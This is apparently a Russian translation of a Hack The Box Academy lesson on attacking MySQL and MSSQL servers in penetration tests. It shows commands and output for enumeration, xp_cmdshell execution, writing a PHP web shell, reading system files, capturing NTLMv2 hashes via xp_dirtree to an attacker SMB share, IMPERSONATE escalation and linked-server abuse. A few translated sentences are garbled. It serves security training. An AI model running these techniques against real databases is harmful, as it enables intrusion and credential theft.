[MySQL](https://www.mysql.com/) и [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) ( `MSSQL`) — это [реляционные](https://en.wikipedia.org/wiki/Relational_database) системы управления базами данных, которые хранят данные в таблицах, столбцах и строках. Многие реляционные системы управления базами данных, такие как MSSQL и MySQL, используют [язык структурированных запросов](https://en.wikipedia.org/wiki/SQL) ( `SQL`SQL) для выполнения запросов и обслуживания базы данных.

Хосты баз данных считаются объектами повышенного риска, поскольку они отвечают за хранение всевозможных конфиденциальных данных, включая, помимо прочего, учетные данные пользователей, `Personal Identifiable Information (PII)`бизнес-данные и платежную информацию. Кроме того, эти сервисы часто настроены с использованием пользователей с высокими привилегиями. Получив доступ к базе данных, мы можем использовать эти привилегии для других действий, включая горизонтальное перемещение и повышение привилегий.

---

## Перечисление

По умолчанию MSSQL использует порты `TCP/1433`и `UDP/1434`, а MySQL — `TCP/3306`. Однако, когда MSSQL работает в «скрытом» режиме, он использует `TCP/2433`порт . Мы можем использовать параметр `Nmap`скриптов по умолчанию `-sC`для перечисления служб базы данных в целевой системе:

#### Захват баннера

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

Сканирование Nmap раскрывает важную информацию о цели, такую ​​как версия и имя хоста, которую мы можем использовать для выявления распространенных ошибок конфигурации, конкретных атак или известных уязвимостей. Давайте рассмотрим некоторые распространенные ошибки конфигурации и атаки, специфичные для протокола.

---

## Механизмы аутентификации

`MSSQL`Поддерживаются два [режима аутентификации](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) , что означает, что пользователи могут быть созданы как в Windows, так и в SQL Server:

| **Тип аутентификации**        | **Описание**                                                                                                                                                                                                                                                                                                                                                                    |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | Это настройки по умолчанию, часто называемые настройками `integrated`безопасности, поскольку модель безопасности SQL Server тесно интегрирована с Windows/Active Directory. Для входа в SQL Server доверяются определенные учетные записи пользователей и групп Windows. Пользователям Windows, прошедшим аутентификацию, не нужно предоставлять дополнительные учетные данные. |
| `Mixed mode`                  | Смешанный режим поддерживает аутентификацию с помощью учетных записей Windows/Active Directory и SQL Server. Пары «имя пользователя и пароль» хранятся в SQL Server.                                                                                                                                                                                                            |

`MySQL`Также поддерживаются различные [методы аутентификации](https://dev.mysql.com/doc/internals/en/authentication-method.html) , такие как имя пользователя и пароль, а также аутентификация Windows (требуется плагин). Кроме того, администраторы могут [выбирать режим аутентификации](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) по многим причинам, включая совместимость, безопасность, удобство использования и многое другое. Однако, в зависимости от выбранного метода, могут возникать ошибки конфигурации.

В прошлом, среди прочего, существовала уязвимость [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) на `MySQL 5.6.x`серверах, которая позволяла обходить аутентификацию, многократно используя один и тот же неверный пароль для данной учетной записи, поскольку уязвимость `timing attack`заключалась в способе обработки попыток аутентификации в MySQL.

В этой атаке по времени MySQL многократно пытается аутентифицироваться на сервере и измеряет время, необходимое серверу для ответа на каждую попытку. Измеряя время ответа сервера, мы можем определить, когда был найден правильный пароль, даже если сервер не сообщает об успехе или неудаче.

В данном случае `MySQL 5.6.x`серверу требуется больше времени для ответа на неверный пароль, чем на правильный. Таким образом, если мы будем неоднократно пытаться пройти аутентификацию с одним и тем же неверным паролем, в конечном итоге мы получим ответ, указывающий на то, что правильный пароль найден, даже если это не так.

#### Неправильные настройки

Неправильно настроенная аутентификация в SQL Server может позволить нам получить доступ к службе без учетных данных, если включен анонимный доступ, настроен пользователь без пароля или любому пользователю, группе или компьютеру разрешен доступ к SQL Server.

#### Привилегии

В зависимости от прав пользователя, мы можем выполнять различные действия в SQL Server, такие как:

- Чтение или изменение содержимого базы данных
    
- Прочтите или измените конфигурацию сервера.
    
- Выполнять команды
    
- Чтение локальных файлов
    
- Взаимодействие с другими базами данных
    
- Захват хеша локальной системы
    
- Выдавать себя за существующих пользователей
    
- Получите доступ к другим сетям
    

В этом разделе мы рассмотрим некоторые из этих атак.

---

## Атаки, специфичные для протокола

Крайне важно понимать, как работает синтаксис SQL. Для ознакомления с синтаксисом SQL можно использовать бесплатный модуль [«Основы SQL-инъекций»](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) . Хотя этот модуль охватывает MySQL, синтаксис MSSQL и MySQL довольно похож.

#### Чтение/изменение базы данных

Представим, что мы получили доступ к базе данных SQL. Во-первых, нам нужно определить существующие базы данных на сервере, какие таблицы они содержат и, наконец, содержимое каждой таблицы. Имейте в виду, что мы можем обнаружить базы данных с сотнями таблиц. Если наша цель не просто получить доступ к данным, нам нужно будет выбрать, какие таблицы могут содержать интересную информацию для продолжения наших атак, такую ​​как имена пользователей и пароли, токены, конфигурации и многое другое. Давайте посмотрим, как мы можем это сделать:

#### MySQL — Подключение к SQL Server

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

#### Sqlcmd — Подключение к SQL Server

  Атаки на базы данных SQL

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

**Примечание:** При аутентификации в MSSQL `sqlcmd`можно использовать параметры `-y`(SQLCMDMAXVARTYPEWIDTH) и `-Y`(SQLCMDMAXFIXEDTYPEWIDTH) для более удобного вывода. Имейте в виду, что это может повлиять на производительность.

Если мы используем Linux в качестве целевой платформы , то в качестве альтернативы `MSSQL`можно использовать :`sqsh``sqlcmd`

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

В качестве альтернативы можно использовать инструмент из Impacket под названием `mssqlclient.py`.

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

**Примечание:** При аутентификации в MSSQL с использованием `sqsh`параметров можно `-h`отключить заголовки и нижние колонтитулы для более аккуратного отображения.

При использовании аутентификации Windows необходимо указать доменное имя или имя хоста целевой машины. Если домен или имя хоста не указаны, будет использоваться аутентификация SQL, и проверка будет производиться с помощью пользователей, созданных в SQL Server. Если же домен или имя хоста указаны, будет использоваться аутентификация Windows. Если используется локальная учетная запись, можно использовать `SERVERNAME\\accountname`или `.\\accountname`. Полная команда будет выглядеть так:

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

#### Базы данных SQL по умолчанию

Прежде чем рассматривать использование синтаксиса SQL, важно знать базы данных по умолчанию для `MySQL`и `MSSQL`. Эти базы данных содержат информацию о самой базе данных и помогают нам перечислять имена баз данных, таблицы, столбцы и т. д. Имея доступ к этим базам данных, мы можем использовать некоторые системные хранимые процедуры, но они обычно не содержат данных компании.

**Примечание:** Мы получим ошибку, если попытаемся получить список баз данных или подключиться к ним, если у нас нет прав доступа.

`MySQL`Схемы/базы данных системы по умолчанию:

- `mysql`— это системная база данных, содержащая таблицы, в которых хранится информация, необходимая серверу MySQL.
- `information_schema`- предоставляет доступ к метаданным базы данных
- `performance_schema`— это функция для мониторинга выполнения MySQL Server на низком уровне.
- `sys`— набор объектов, помогающих администраторам баз данных и разработчикам интерпретировать данные, собранные схемой производительности.

`MSSQL`Схемы/базы данных системы по умолчанию:

- `master`- хранит информацию об экземпляре SQL Server.
- `msdb`- используется агентом SQL Server.
- `model`- для каждой новой базы данных создается копия шаблонной базы данных.
- `resource`- база данных только для чтения, которая обеспечивает видимость системных объектов во всех базах данных на сервере в схеме sys.
- `tempdb`- хранит временные объекты для SQL-запросов.

#### Синтаксис SQL

#### Показать базы данных

  Атаки на базы данных SQL

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Если мы используем `<` , то после запроса `sqlcmd`нам потребуется использовать `<` для выполнения синтаксиса SQL.`GO`

  Атаки на базы данных SQL

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Выберите базу данных

  Атаки на базы данных SQL

```shell-session
mysql> USE htbusers;

Database changed
```

  Атаки на базы данных SQL

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### Выставочные столы

  Атаки на базы данных SQL

```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

  Атаки на базы данных SQL

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

#### Выберите все данные из таблицы "пользователи"

  Атаки на базы данных SQL

```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

  Атаки на базы данных SQL

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

---

## Выполнение команд

`Command execution`Это одна из наиболее востребованных возможностей при атаках на распространенные сервисы, поскольку она позволяет нам контролировать операционную систему. При наличии соответствующих привилегий мы можем использовать базу данных SQL для выполнения системных команд или создания необходимых для этого элементов.

`MSSQL`имеет расширенную хранимую [процедуру](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) , которая позволяет выполнять системные команды с помощью SQL. Следует помнить следующее `xp_cmdshell`:

- `xp_cmdshell`Это мощная функция, отключенная по умолчанию. `xp_cmdshell`Ее можно включить и отключить с помощью [управления на основе политик](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) или путем выполнения [команды sp_configure.](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- Процесс Windows, запущенный с помощью этой учетной записи, `xp_cmdshell`обладает теми же правами доступа, что и учетная запись службы SQL Server.
- `xp_cmdshell`Работает синхронно. Управление не возвращается вызывающей стороне до завершения выполнения команды командной оболочки.

Для выполнения команд с использованием синтаксиса SQL в MSSQL используйте:

#### XP_CMDSHELL

  Атаки на базы данных SQL

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Если `xp_cmdshell`эта функция не включена, мы можем включить её, если у нас есть соответствующие права, используя следующую команду:

Код: mssql

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

Существуют и другие методы выполнения команд, такие как добавление [расширенных хранимых процедур](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server) , [сборок CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration) , [заданий агента SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) и [внешних скриптов](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql) . Однако, помимо этих методов, можно использовать и дополнительные функции, например, `xp_regwrite`команду для повышения привилегий путем создания новых записей в реестре Windows. Тем не менее, эти методы выходят за рамки данного модуля.

`MySQL`Поддерживаются [пользовательские функции (User Defined Functions)](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) , которые позволяют выполнять код C/C++ в виде функции внутри SQL; в этом [репозитории GitHub](https://github.com/mysqludf/lib_mysqludf_sys) есть одна пользовательская функция для выполнения команд . В производственной среде нечасто встречаются подобные пользовательские функции, но следует помнить, что мы можем их использовать.

---

## Запись локальных файлов

`MySQL`В отличие от других систем, в ASP.NET нет хранимых процедур, подобных этой `xp_cmdshell`, но мы можем выполнить команду, если запишем её в файловую систему, которая может её выполнить. Например, предположим, что `MySQL`система работает на веб-сервере на основе PHP или других языках программирования, таких как ASP.NET. Если у нас есть соответствующие права, мы можем попытаться записать файл, используя команду [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) в каталоге веб-сервера. Затем мы можем перейти к местоположению файла и выполнить наши команды.

#### MySQL - Запись в локальный файл

  Атаки на базы данных SQL

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

В `MySQL`системе глобальная системная переменная [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) ограничивает действие операций импорта и экспорта данных, таких как операции, выполняемые операторами `LOAD DATA`и `SELECT … INTO OUTFILE`функцией [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) . Эти операции разрешены только пользователям, имеющим привилегию [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) .

`secure_file_priv`может быть установлено следующим образом:

- Если переменная пуста, она не оказывает никакого эффекта, что является небезопасным параметром.
- Если задано имя каталога, сервер ограничивает операции импорта и экспорта только файлами, находящимися в этом каталоге. Каталог должен существовать; сервер его не создает.
- Если установить значение NULL, сервер отключит операции импорта и экспорта.

В следующем примере мы видим, `secure_file_priv`что переменная пуста, а это значит, что мы можем читать и записывать данные, используя `MySQL`:

#### MySQL — Безопасные файловые привилегии

  Атаки на базы данных SQL

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Для записи файлов с использованием `MSSQL`OLE нам необходимо включить [процедуры автоматизации OLE](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) , что требует прав администратора, а затем выполнить несколько хранимых процедур для создания файла:

#### MSSQL — Включение процедур автоматизации OLE

  Атаки на базы данных SQL

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Создание файла

  Атаки на базы данных SQL

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---

## Чтение локальных файлов

По умолчанию `MSSQL`разрешается чтение любого файла в операционной системе, к которому у учетной записи есть доступ на чтение. Мы можем использовать следующий SQL-запрос:

#### Чтение локальных файлов в MSSQL

  Атаки на базы данных SQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Как мы уже упоминали, по умолчанию `MySQL`установка не разрешает произвольное чтение файлов, но если установлены правильные настройки и имеются соответствующие права доступа, мы можем читать файлы следующими способами:

#### MySQL — чтение локальных файлов в MySQL

  Атаки на базы данных SQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---

## Захват хеша службы MSSQL

В предыдущем `Attacking SMB`разделе мы обсуждали возможность создания поддельного SMB-сервера для кражи хеша и использования некоторых стандартных реализаций в операционной системе Windows. Мы также можем украсть хеш учетной записи службы MSSQL, используя `xp_subdirs`недокументированные `xp_dirtree`хранимые процедуры, которые используют протокол SMB для получения списка дочерних каталогов в указанном родительском каталоге из файловой системы. Когда мы используем одну из таких хранимых процедур и указываем на наш SMB-сервер, функция прослушивания каталогов заставит сервер аутентифицироваться и отправить хеш NTLMv2 учетной записи службы, на которой запущен SQL Server.

Для этого нам сначала нужно запустить [Responder](https://github.com/lgandx/Responder) или [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) и выполнить один из следующих SQL-запросов:

#### XP_DIRTREE Кража хеша

  Атаки на базы данных SQL

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Кража хеша

  Атаки на базы данных SQL

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Если у учетной записи службы есть доступ к нашему серверу, мы получим его хеш. Затем мы можем попытаться взломать хеш или передать его на другой хост.

#### XP_SUBDIRS — кража хеша с помощью Responder

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

#### Кража хеша XP_SUBDIRS с помощью impacket

  Атаки на базы данных SQL

```shell-session
MuraMitchi@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

---

## Имитация существующих пользователей с помощью MSSQL

В SQL Server существует специальное разрешение, называемое `IMPERSONATE`, которое позволяет пользователю, выполняющему операцию, принимать на себя права другого пользователя или входа в систему до тех пор, пока контекст не будет сброшен или сессия не завершится. Давайте рассмотрим, как это `IMPERSONATE`разрешение может привести к повышению привилегий в SQL Server.

Во-первых, нам нужно определить пользователей, от имени которых мы можем производить имитацию. Системные администраторы по умолчанию могут производить имитацию любого пользователя, но для пользователей, не являющихся администраторами, привилегии должны быть назначены явно. Для определения пользователей, от имени которых мы можем производить имитацию, мы можем использовать следующий запрос:

#### Выявление пользователей, от имени которых мы можем производить имитацию.

  Атаки на базы данных SQL

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Чтобы получить представление о возможностях повышения привилегий, давайте проверим, имеет ли текущий пользователь роль системного администратора:

#### Проверка текущего пользователя и его роли.

  Атаки на базы данных SQL

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Как показывает возвращаемое значение `0`, у нас нет роли системного администратора, но мы можем выдать себя за этого `sa`пользователя. Давайте выдадим себя за этого пользователя и выполним те же команды. Для этого мы можем использовать оператор Transact-SQL `EXECUTE AS LOGIN`и установить его в качестве пользователя, за которого хотим выдать себя.

#### Выдача себя за пользователя SA

  Атаки на базы данных SQL

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

**Примечание:** Рекомендуется запускать программу `EXECUTE AS LOGIN`в основной базе данных, поскольку все пользователи по умолчанию имеют к ней доступ. Если пользователь, от имени которого вы пытаетесь выполнить операцию, не имеет доступа к базе данных, к которой вы подключаетесь, возникнет ошибка. Попробуйте перейти к основной базе данных, используя команду `.` `USE master`.

Теперь мы можем выполнять любую команду от имени системного администратора, как указывает возвращаемое значение `1`. Чтобы отменить операцию и вернуться к предыдущему пользователю, мы можем использовать оператор Transact-SQL `REVERT`.

**Примечание:** Если мы обнаружим пользователя, не являющегося системным администратором, мы все равно можем проверить, имеет ли он доступ к другим базам данных или связанным серверам.

---

## Взаимодействие с другими базами данных с помощью MSSQL

`MSSQL`В конфигурации есть параметр, называемый [«связанные серверы»](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) . Связанные серверы обычно настраиваются для того, чтобы позволить ядру базы данных выполнять оператор Transact-SQL, включающий таблицы в другом экземпляре SQL Server или другом продукте базы данных, таком как Oracle.

Если нам удастся получить доступ к SQL Server с настроенным связанным сервером, мы сможем перейти на этот сервер баз данных. Администраторы могут настроить связанный сервер, используя учетные данные с удаленного сервера. Если эти учетные данные имеют права системного администратора, мы сможем выполнять команды в удаленном экземпляре SQL. Давайте посмотрим, как мы можем идентифицировать и выполнять запросы на связанных серверах.

#### Идентификация связанных серверов в MSSQL

  Атаки на базы данных SQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Как видно из результатов запроса, у нас есть имя сервера и столбец `isremote`, где `1`означает удаленный сервер, а `0`— связанный сервер. Для получения более подробной информации см [. Transact-SQL для sysservers .](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql)

Далее мы можем попытаться определить пользователя, используемого для подключения, и его привилегии. Оператор [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) можно использовать для отправки команд на связанные серверы. Мы добавляем нашу команду в скобки и указываем связанный сервер в квадратных скобках ( `[ ]`).

  Атаки на базы данных SQL

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Примечание:** Если в запросе к связанному серверу необходимо использовать кавычки, следует использовать одинарные двойные кавычки для экранирования одинарной кавычки. Для одновременного выполнения нескольких команд можно разделить их точкой с запятой (;).

Как мы уже видели, теперь мы можем выполнять запросы с правами системного администратора на связанном сервере. Таким образом `sysadmin`, мы контролируем экземпляр SQL Server. Мы можем читать данные из любой базы данных или выполнять системные команды `xp_cmdshell`. В этом разделе были рассмотрены некоторые из наиболее распространенных способов атаки на базы данных SQL Server и MySQL во время тестирования на проникновение. Существуют и другие методы атаки на эти типы баз данных, а также на другие, такие как [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) , SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database) и [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) , которые будут рассмотрены в других модулях. Стоит уделить некоторое время изучению этих технологий баз данных и некоторых распространенных способов их атаки.